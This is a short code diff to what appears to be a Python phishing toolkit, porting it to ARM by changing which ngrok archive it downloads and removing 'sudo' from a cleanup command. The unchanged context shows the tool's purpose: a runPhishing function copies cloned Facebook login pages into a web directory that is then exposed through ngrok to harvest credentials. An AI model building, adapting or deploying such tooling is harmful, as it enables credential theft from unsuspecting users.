@@ -33,9 +33,9 @@ def checkNgrok():
     if path.isfile('Server/ngrok') == False: 
         print '[*] Downloading Ngrok...'
         if architecture()[0] == '64bit':
-            filename = 'ngrok-stable-linux-amd64.zip'
+            filename = 'ngrok-stable-linux-arm.zip'
         else:
-            filename = 'ngrok-stable-linux-386.zip'
+            filename = 'ngrok-stable-linux-arm.zip'
         url = 'https://bin.equinox.io/c/4VmDzA7iaHb/' + filename
         download(url)
         system('unzip ' + filename)
@@ -74,7 +74,7 @@ def loadModule(module):
  [{1}*{0}]{1} %s module loaded.{0}'''.format(CYAN, END) % module
 
 def runPhishing(social, option2):
-    system('sudo rm -Rf Server/www/*.* && touch Server/www/cat.txt')
+    system('rm -Rf Server/www/*.* && touch Server/www/cat.txt')
     if option2 == '1' and social == 'Facebook':
         system('cp WebPages/fb_standard/*.* Server/www/')
     if option2 == '2' and social == 'Facebook':
